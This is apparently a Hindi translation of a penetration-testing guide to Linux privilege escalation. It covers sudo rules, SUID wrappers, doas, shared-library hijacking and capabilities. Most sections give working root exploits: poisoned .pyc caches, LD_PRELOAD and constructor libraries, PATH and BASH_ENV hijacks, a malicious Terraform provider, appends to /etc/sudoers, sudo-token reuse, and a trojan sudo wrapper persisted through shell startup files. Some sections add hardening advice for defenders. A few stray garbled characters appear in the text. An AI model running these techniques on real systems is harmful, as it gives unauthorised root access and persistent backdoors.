यदि caller उस `.3mf` project को चुन सकता है जिसे slice किया जाएगा, तो `prusaslicer` या `prusa-slicer` के लिए root-capable sudo grant की समीक्षा करना उचित है। किसी project में post-processing script हो सकती है, जो G-code export होने पर चलती है; crafted projects, 2.6.1 तक के PrusaSlicer में commands चला सकते हैं ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268))। निष्कर्ष निकालने से पहले कि privilege boundary तक पहुँचा जा सकता है, प्रभावी sudo rule, binary version और vendor patches, project का स्रोत, तथा यह जाँचें कि संबंधित export path चलता है या नहीं। तय project argument या प्रभावी `NOEXEC` policy से परिणाम बदल सकता है। केवल slicer installed मिल जाने से privilege escalation path स्थापित नहीं होता।

### SETENV

यह directive user को कुछ execute करते समय **environment variable सेट करने** की अनुमति देता है:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

यह उदाहरण, **HTB machine Admirer** पर आधारित, **PYTHONPATH hijacking** के प्रति **vulnerable** था, जिससे script को root के रूप में execute करते समय मनमानी Python library load की जा सकती थी:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### sudo-allowed Python imports में writable `__pycache__` / `.pyc` poisoning

अगर कोई **sudo-allowed Python script** ऐसे module को import करती है जिसके package directory में **writable `__pycache__`** है, तो आप cached `.pyc` को बदलकर अगले import पर privileged user के रूप में code execution पा सकते हैं।<sup>[[30]](#references)</sup>

- यह क्यों काम करता है:
  - CPython bytecode caches को `__pycache__/module.cpython-<ver>.pyc` में रखता है।<sup>[[31]](#references)</sup>
  - Interpreter **header** (magic + source से जुड़े timestamp/hash metadata) को validate करता है, फिर उस header के बाद stored marshaled code object को execute करता है।
  - अगर directory writable होने की वजह से आप cached file को **delete और recreate** कर सकते हैं, तो root-owned लेकिन non-writable `.pyc` को भी बदला जा सकता है।
- सामान्य तरीका:
  - `sudo -l` में कोई Python script या wrapper दिखता है जिसे आप root के रूप में चला सकते हैं।
  - वह script `/opt/app/`, `/usr/local/lib/...` आदि से कोई local module import करती है।
  - Imported module की `__pycache__` directory आपके user या सभी के लिए writable है।

त्वरित enumeration:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

यदि आप privileged script का निरीक्षण कर सकते हैं, तो imported modules और उनका cache path पहचानें:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Abuse workflow:

1. sudo-allowed script को एक बार चलाएँ, ताकि Python legit cache file बना दे, अगर वह पहले से मौजूद न हो।
2. legit `.pyc` से पहले 16 bytes पढ़ें और उन्हें poisoned file में फिर से इस्तेमाल करें।
3. एक payload code object compile करें, उसे `marshal.dumps(...)` करें, मूल cache file delete करें, और original header के साथ अपना malicious bytecode रखकर उसे फिर से बनाएँ।
4. payload को root के रूप में चलाने के लिए sudo-allowed script फिर से चलाएँ।

महत्वपूर्ण नोट्स:

- Original header को फिर से इस्तेमाल करना अहम है, क्योंकि Python cache metadata की जाँच source file से करता है, न कि इस बात की कि bytecode body वास्तव में source से मेल खाती है या नहीं।
- यह खास तौर पर तब उपयोगी है जब source file root-owned हो और writable न हो, लेकिन उसे रखने वाली `__pycache__` directory writable हो।
- `PYTHONDONTWRITEBYTECODE=1` और `python -B` Python को नई `.pyc` files लिखने से रोकते हैं; वे पहले से मौजूद, attacker द्वारा बदली गई cache को load करने से **नहीं** रोकते। अहम सीमा यह है कि क्या कम privileges वाला user ऐसी cache बदल सकता है जिसे privileged import स्वीकार करेगा। Cached bytecode load करने से पहले Python timestamp/size या hash metadata जाँचता है। [Python import reference](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) और [command-line documentation](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE) देखें।

न्यूनतम proof-of-concept का स्वरूप:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

सुरक्षा सुदृढ़ीकरण:

- सुनिश्चित करें कि privileged Python import path की कोई भी directory कम विशेषाधिकार वाले users द्वारा writable न हो, इसमें `__pycache__` भी शामिल है।
- Cache-directory का ownership और permissions जाँचें, इसमें मौजूदा `.pyc` files भी शामिल हैं। Bytecode writes बंद करने से नए cache बनने कम हो सकते हैं, लेकिन इससे पहले से मौजूद और बदली जा सकने वाली cache निष्क्रिय नहीं होती।
- Writable local Python modules और writable cache directories को उसी तरह मानें, जैसे root द्वारा execute की जाने वाली writable shell scripts या shared libraries को मानते हैं।

### sudo env_keep के ज़रिए BASH_ENV संरक्षित → root shell

यदि sudoers `BASH_ENV` को संरक्षित करता है (जैसे, `Defaults env_keep+="ENV BASH_ENV"`), तो किसी अनुमत command को invoke करते समय root के रूप में मनमाना code चलाने के लिए Bash के non-interactive startup behavior का लाभ उठाया जा सकता है।<sup>[[24]](#references)</sup>

- यह क्यों काम करता है: Non-interactive shells के लिए, Bash target script चलाने से पहले `$BASH_ENV` को evaluate करता है और उस file को source करता है। कई sudo rules किसी script या shell wrapper को चलाने की अनुमति देते हैं। यदि sudo द्वारा `BASH_ENV` संरक्षित है, तो आपकी file root privileges के साथ source होती है।<sup>[[23]](#references)</sup>

- आवश्यकताएँ:
  - ऐसा sudo rule जिसे आप चला सकें (कोई भी target जो `/bin/bash` को non-interactively invoke करता हो, या कोई bash script)।
  - `BASH_ENV`, `env_keep` में मौजूद हो (`sudo -l` से जाँचें)।

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Hardening:
  - `env_keep` से `BASH_ENV` (और `ENV`) हटाएँ, `env_reset` को प्राथमिकता दें।
  - `sudo`-अनुमत कमांड के लिए shell wrappers का उपयोग न करें; न्यूनतम binaries का उपयोग करें।
  - संरक्षित env vars का उपयोग होने पर sudo I/O logging और alerting पर विचार करें।

### sudo के ज़रिए Terraform, संरक्षित HOME के साथ (!env_reset)

जब sudo किसी अधिक privileged user के रूप में Terraform चलाने की अनुमति देता है, तो `!env_reset` यह जाँचने का संकेत है कि उस विशेष rule में कौन-से environment variables वास्तव में बने रहते हैं। caller-writable `.terraformrc` या `terraform.rc` को सक्रिय CLI configuration मानने से पहले, प्रभावी `HOME` या `TF_CLI_CONFIG_FILE` की पुष्टि करें। `provider_installation.dev_overrides` की entry तभी मायने रखती है, जब तय Terraform command उस provider को लोड करे और caller उसका executable चुनी गई directory में रख सके।<sup>[[25]](#references)</sup>

- आवश्यक provider को writable directory पर इंगित करें और provider के नाम पर एक malicious plugin रखें (जैसे, `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform Go plugin handshake में विफल होगा, लेकिन बंद होने से पहले payload को root के रूप में चलाता है और पीछे एक SUID shell छोड़ जाता है।

### TF_VAR overrides + symlink validation bypass

अगर sudo का विशेष rule उन्हें preserve करता है, तो Terraform variables `TF_VAR_<name>` environment variables के ज़रिए दिए जा सकते हैं। Source-symlink **read** के लिए ऐसे provider की भी ज़रूरत होती है जो link को follow करे और protected result को caller-readable destination पर copy करे। Destination-symlink **write** के लिए अलग से caller-controlled destination entry और ऐसा privileged provider चाहिए जो write करते समय उसे follow करे; बाद में चलने वाला scheduled job इसका केवल एक संभावित परिणाम है। इनमें से किसी भी route को test करने से पहले, read-only commands जैसे `sudo -l`, `stat` और `readlink` से सटीक sudo grant, संबंधित `.tf` files, चुनी गई CLI config और path ownership की जाँच करें। `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` जैसे कमज़ोर lexical validations symlinks को resolve नहीं करते:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform symlink को resolve करता है और असली `/root/root.txt` को ऐसे destination में कॉपी करता है जिसे attacker पढ़ सकता है। इसी तरीके का उपयोग destination symlinks पहले से बनाकर privileged paths में **लिखने** के लिए भी किया जा सकता है (जैसे, provider का destination path `/etc/cron.d/` के अंदर किसी स्थान पर point करना)।

### requiretty / !requiretty

कुछ पुराने distributions पर, sudo को `requiretty` के साथ configure किया जा सकता है, जो sudo को केवल interactive TTY से चलने के लिए बाध्य करता है। यदि `!requiretty` सेट है (या यह option मौजूद नहीं है), तो sudo को reverse shells, cron jobs या scripts जैसे non-interactive contexts से चलाया जा सकता है।

```bash
Defaults !requiretty
```

यह अपने आप में सीधी vulnerability नहीं है, लेकिन इससे वे स्थितियाँ बढ़ जाती हैं जिनमें पूरी PTY की ज़रूरत के बिना sudo rules का दुरुपयोग किया जा सकता है।

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

अगर `sudo -l` में `env_keep+=PATH` दिखता है या `secure_path` में attacker-writable entries (जैसे `/home/<user>/bin`) शामिल हैं, तो sudo-allowed target के भीतर किसी unqualified external command को shadow किया जा सकता है।<sup>[[3]](#references)</sup> प्रभावी `secure_path` का न होना भी जाँचने योग्य है **अगर** command का sudo environment caller-controlled `PATH` को बनाए रखता है; केवल इसका न होना इस बात का प्रमाण नहीं है। अनुमत script को चलाए बिना पढ़ें, फिर सटीक RunAs और argument rule, प्रभावी command search path, और command name वाली किसी पहले खोजी जाने वाली writable और traversable directory की पुष्टि करें। Authentication, `NOEXEC`, shell builtins और absolute command paths नतीजे को बदल सकते हैं।

- आवश्यकताएँ: ऐसा sudo rule (अक्सर `NOPASSWD`) जो ऐसी script/binary चलाता हो जो commands को absolute paths के बिना (`free`, `df`, `ps` आदि) call करती हो, और ऐसी writable PATH entry जो सबसे पहले खोजी जाती हो।

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Sudo execution में paths को bypass करना
**Jump** करके दूसरी files पढ़ें या **symlinks** का इस्तेमाल करें। उदाहरण के लिए, sudoers file में: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

यदि **wildcard** का उपयोग किया जाता है (\*), तो यह और भी आसान है:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary बिना command path के

अगर **sudo permission** किसी एक command को **path बताए बिना** दी गई है: _hacker10 ALL= (root) less_, तो PATH variable बदलकर इसका exploit किया जा सकता है

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

इस तकनीक का उपयोग तब भी किया जा सकता है, जब कोई **suid** binary **पाथ बताए बिना कोई दूसरा command चलाती है (किसी अजीब SUID binary का content हमेशा** _**strings**_ **से जाँचें)**।

[चलाने के लिए Payload के उदाहरण।](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### कमांड पाथ के साथ SUID binary

अगर **suid** binary **पाथ बताते हुए कोई दूसरा command चलाती है**, तो आप उस command के नाम से **एक function export** करने की कोशिश कर सकते हैं, जिसे suid फ़ाइल call कर रही है।

उदाहरण के लिए, अगर कोई suid binary _**/usr/sbin/service apache2 start**_ call करती है, तो आपको function बनाने और उसे export करने की कोशिश करनी चाहिए:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

फिर, जब आप SUID binary को कॉल करेंगे, तो यह function execute होगा

### Custom SUID copy wrappers

Root-owned SUID utility, जो source और destination paths स्वीकार करती है, दो अलग-अलग trust boundaries को पार कर सकती है। यदि यह किसी argument से shell command बनाती है (उदाहरण के लिए, `system()` को बनाया हुआ `cp` command देना), तो shell metacharacters इसके effective privileges के साथ कोई दूसरा command execute कर सकते हैं। भले ही यह shell के बिना सुरक्षित तरीके से `cp` invoke करे, unrestricted destination से `/etc/passwd` जैसी files में arbitrary privileged write की अनुमति मिल सकती है। Wrapper के argument handling, effective UID behavior, destination restrictions और इस बात की जाँच करें कि copy की गई file में caller द्वारा नियंत्रित contents बने रहते हैं या नहीं; सामान्य `cp` error या केवल SUID bit इनमें से किसी भी स्थिति का प्रमाण नहीं है। किसी भी manual testing से पहले binary और permissions की passive enumeration करें।

### SUID wrapper द्वारा execute की जाने वाली writable script

Custom app की एक आम misconfiguration यह है कि root-owned SUID binary wrapper एक script execute करती है, जबकि low-priv users उस script में लिख सकते हैं।

सामान्य pattern:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

यदि `/usr/local/bin/backup.sh` में लिखा जा सकता है, तो आप उसमें payload commands जोड़कर SUID wrapper चला सकते हैं:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

त्वरित जाँच:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

यह attack path `/usr/local/bin` में भेजे गए "maintenance"/"backup" wrappers में विशेष रूप से आम है।

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** environment variable का उपयोग एक या अधिक shared libraries (.so files) निर्दिष्ट करने के लिए किया जाता है, जिन्हें loader अन्य सभी libraries से पहले लोड करता है, जिसमें standard C library (`libc.so`) भी शामिल है। इस प्रक्रिया को library preloading कहा जाता है।

हालाँकि, system security बनाए रखने और इस feature के दुरुपयोग को रोकने के लिए, विशेषकर **suid/sgid** executables के मामले में, system कुछ शर्तें लागू करता है:

- यदि real user ID (_ruid_) effective user ID (_euid_) से मेल नहीं खाता, तो loader executables के लिए **LD_PRELOAD** को अनदेखा करता है।
- suid/sgid वाले executables के लिए, केवल standard paths में मौजूद वे libraries preload की जाती हैं जो स्वयं भी suid/sgid हों।

यदि आपके पास `sudo` के साथ commands चलाने की क्षमता है और `sudo -l` के output में **env_keep+=LD_PRELOAD** कथन शामिल है, तो privilege escalation हो सकता है। यह configuration **LD_PRELOAD** environment variable को बनाए रखने और `sudo` के साथ commands चलाने पर भी उसे पहचानने की अनुमति देता है, जिससे संभावित रूप से elevated privileges के साथ मनमाना code चलाया जा सकता है।<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

इस रूप में सहेजें **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

फिर इसे **compile** करें:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

अंत में, **escalate privileges** चलाएँેણ

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> यदि attacker **LD_LIBRARY_PATH** env variable को नियंत्रित करता है, तो इसी तरह के privesc का दुरुपयोग किया जा सकता है, क्योंकि वह उस path को नियंत्रित करता है जहाँ libraries खोजी जाएँगी।

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

जब कोई असामान्य **SUID** permissions वाला binary मिले, तो यह जाँचना अच्छा रहता है कि वह **.so** files को सही तरीके से load कर रहा है या नहीं। इसे निम्न command चलाकर जाँचा जा सकता है:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी त्रुटि मिलने पर, इसका अर्थ हो सकता है कि इसका exploitation संभव है।

इसे exploit करने के लिए, एक C फ़ाइल बनाएं, मान लें _"/path/to/.config/libcalc.c"_, जिसमें निम्नलिखित code हो:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

यह कोड, compile और execute होने के बाद, file permissions में बदलाव करके और elevated privileges के साथ shell execute करके privileges बढ़ाने का लक्ष्य रखता है।

ऊपर दी गई C file को shared object (.so) file में compile करें:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

अंत में, प्रभावित SUID binary चलाने से exploit ट्रिगर होना चाहिए, जिससे संभावित रूप से system compromise हो सकता है।

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

अब जब हमें ऐसा SUID binary मिल गया है जो उस फ़ोल्डर से library लोड करता है जिसमें हम लिख सकते हैं, तो ज़रूरी नाम वाली library उस फ़ोल्डर में बनाते हैं:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

यदि आपको इस तरह की कोई त्रुटि मिलती है तो񎟿

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

इसका मतलब है कि आपके द्वारा बनाई गई library में `a_function_name` नाम का function होना चाहिए।

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix binaries की एक curated list है, जिनका उपयोग attacker स्थानीय सुरक्षा प्रतिबंधों को bypass करने के लिए कर सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) भी ऐसी ही list है, लेकिन उन मामलों के लिए जहाँ आप किसी command में **केवल arguments inject कर सकते हैं**।

यह project Unix binaries के वैध functions का संग्रह करता है, जिनका दुरुपयोग restricted shells से बाहर निकलने, elevated privileges बढ़ाने या बनाए रखने, files transfer करने, bind और reverse shells शुरू करने, और अन्य post-exploitation tasks को आसान बनाने के लिए किया जा सकता है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

अगर आप `sudo -l` चला सकते हैं, तो [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) tool का उपयोग करके जाँच सकते हैं कि क्या यह किसी sudo rule का exploit ढूँढता है।

### Sudo Tokens का पुनः उपयोग

ऐसे मामलों में जहाँ आपके पास **sudo access** है, लेकिन password नहीं है, आप **sudo command के चलने का इंतज़ार करके और फिर session token hijack करके** privileges बढ़ा सकते हैं।<sup>[[18]](#references)</sup>

Privileges बढ़ाने की आवश्यकताएँ:

- आपके पास पहले से user "_sampleuser_" के रूप में एक shell है
- "_sampleuser_" ने **पिछले 15mins में** कुछ execute करने के लिए `sudo` का उपयोग किया हो (डिफ़ॉल्ट रूप से sudo token की अवधि इतनी होती है, जिसके दौरान हम कोई password दिए बिना `sudo` का उपयोग कर सकते हैं)
- `cat /proc/sys/kernel/yama/ptrace_scope` का मान 0 हो
- `gdb` उपलब्ध हो (आप इसे upload कर सकें)

(आप `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` चलाकर `ptrace_scope` को अस्थायी रूप से enable कर सकते हैं या `/etc/sysctl.d/10-ptrace.conf` में बदलाव करके और `kernel.yama.ptrace_scope = 0` सेट करके इसे स्थायी रूप से enable कर सकते हैं।)

अगर ये सभी आवश्यकताएँ पूरी हों, तो आप इस tool का उपयोग करके privileges बढ़ा सकते हैं: [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **पहला exploit** (`exploit.sh`) _/tmp_ में `activate_sudo_token` binary बनाएगा। आप इसका उपयोग **अपने session में sudo token activate करने के लिए** कर सकते हैं (आपको अपने आप root shell नहीं मिलेगा; `sudo su` चलाएँ):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **दूसरा exploit** (`exploit_v2.sh`) _/tmp_ में **root के स्वामित्व वाला setuid sh shell** बनाएगा

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **तीसरा exploit** (`exploit_v3.sh`) एक **sudoers फ़ाइल बनाएगा**, जिससे **sudo tokens हमेशा के लिए मान्य हो जाएंगे और सभी उपयोगकर्ता sudo का इस्तेमाल कर सकेंगे**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

अगर आपके पास फ़ोल्डर में या फ़ोल्डर के अंदर बनाई गई किसी फ़ाइल पर **write permissions** हैं, तो आप किसी user और PID के लिए **sudo token बनाने** के लिए binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का इस्तेमाल कर सकते हैं।\
उदाहरण के लिए, अगर आप फ़ाइल _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और आपके पास उस user के रूप में PID 1234 वाला shell है, तो आप पासवर्ड जाने बिना **sudo privileges हासिल** कर सकते हैं:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

फ़ाइल `/etc/sudoers` और `/etc/sudoers.d` के अंदर की फ़ाइलें कॉन्फ़िगर करती हैं कि कौन `sudo` का उपयोग कर सकता है और कैसे। **डिफ़ॉल्ट रूप से ये फ़ाइलें केवल user root और group root द्वारा पढ़ी जा सकती हैं**।\
**अगर** आप इस फ़ाइल को **पढ़** सकते हैं, तो आपको **कुछ दिलचस्प जानकारी मिल सकती है**, और अगर आप कोई फ़ाइल **लिख** सकते हैं, तो आप **privileges escalate** कर पाएँगे।

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

अगर आप लिख सकते हैं, तो इस अनुमति का दुरुपयोग कर सकते हैं.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

इन अनुमतियों का दुरुपयोग करने का एक और तरीका:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

`sudo` बाइनरी के कुछ विकल्प भी हैं, जैसे OpenBSD के लिए `doas`। इसकी कॉन्फ़िगरेशन `/etc/doas.conf` में देखना न भूलें।

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

यदि `doas` किसी editor या interpreter की अनुमति देता है, तो GTFOBins-style escapes जाँचें:

```bash
doas vim
:!/bin/sh
```

एक root-capable `doas` rule जो मूल Python-based `dstat` के लिए हो, उसके plugin-path की भी समीक्षा करनी चाहिए। इसका [manual](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) और [source](https://github.com/dstat-real/dstat/blob/master/dstat), `dstat_*.py` plugins के स्थानों में `/usr/share/dstat/` और `/usr/local/share/dstat/` को सूचीबद्ध करते हैं। यदि मौजूदा user, installed build द्वारा वास्तव में इस्तेमाल किए जाने वाले किसी स्थान में लिख और खोज सकता है, तो चुना गया plugin `doas` RunAs identity के साथ चल सकता है। प्रभावी rule, उस build में plugin lookup, directory और parent permissions या ACLs, और यह पुष्टि करें कि caller plugin चुन सकता है या नहीं; केवल `dstat` rule या writable directory होना बस एक सुराग है। अन्य `dstat` implementations अलग plugin systems का उपयोग कर सकते हैं। Plugin लोड किए बिना metadata को निष्क्रिय रूप से inspect करें।

### Sudo Hijacking

यदि आपको पता है कि कोई **user आम तौर पर किसी machine से जुड़ता है और privileges बढ़ाने के लिए `sudo` का इस्तेमाल करता है**, और आपको उस user के context में shell मिल गया है, तो आप **एक नया sudo executable बना सकते हैं** जो आपका code root के रूप में और उसके बाद user की command चलाएगा। फिर, user के context का **$PATH बदलें** (उदाहरण के लिए .bash_profile में नया path जोड़कर), ताकि user के `sudo` चलाने पर आपका sudo executable चले।

ध्यान दें कि यदि user कोई अलग shell इस्तेमाल करता है (bash नहीं), तो नया path जोड़ने के लिए आपको दूसरी files बदलनी होंगी। उदाहरण के लिए [sudo-piggyback](https://github.com/APTy/sudo-piggyback), `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को बदलता है। एक और उदाहरण [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में मिल सकता है।

या कुछ ऐसा चलाकर:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## साझा लाइब्रेरी

### ld.so

फ़ाइल `/etc/ld.so.conf` बताती है कि **लोड की गई configuration फ़ाइलें कहाँ से ली जाती हैं**। आमतौर पर, इस फ़ाइल में यह path होता है: `include /etc/ld.so.conf.d/*.conf`

इसका मतलब है कि `/etc/ld.so.conf.d/*.conf` की configuration फ़ाइलें पढ़ी जाएँगी। ये configuration फ़ाइलें **अन्य फ़ोल्डरों की ओर संकेत करती हैं**, जहाँ **libraries** को **खोजा** जाएगा। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` की सामग्री `/usr/local/lib` है। **इसका मतलब है कि सिस्टम `/usr/local/lib` के अंदर libraries खोजेगा**।

अगर किसी वजह से **किसी user के पास write permissions हैं** इन paths में से किसी पर: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के अंदर की कोई फ़ाइल, या `/etc/ld.so.conf.d/*.conf` में मौजूद config फ़ाइल के अंदर दिया गया कोई फ़ोल्डर, तो वह privileges escalate कर सकता है।\
इस misconfiguration का **शोषण कैसे करें**, यह इस पेज पर देखें:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

`lib` को `/var/tmp/flag15/` में कॉपी करने पर, `RPATH` variable में निर्दिष्ट इस स्थान पर प्रोग्राम इसका उपयोग करेगा।

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

इसके बाद `/var/tmp` में एक evil library बनाएं: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## क्षमताएँ

Linux capabilities किसी प्रक्रिया को उपलब्ध root privileges का **एक subset प्रदान करती हैं**। इससे root **privileges छोटी और अलग-अलग इकाइयों में बँट जाती हैं**। फिर इनमें से हर इकाई को स्वतंत्र रूप से प्रक्रियाओं को दिया जा सकता है। इस तरह privileges का पूरा सेट कम हो जाता है, जिससे exploitation के जोखिम घटते हैं।\
**Capabilities और उनका दुरुपयोग करने के तरीकों के बारे में अधिक जानने के लिए** यह पेज पढ़ें:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

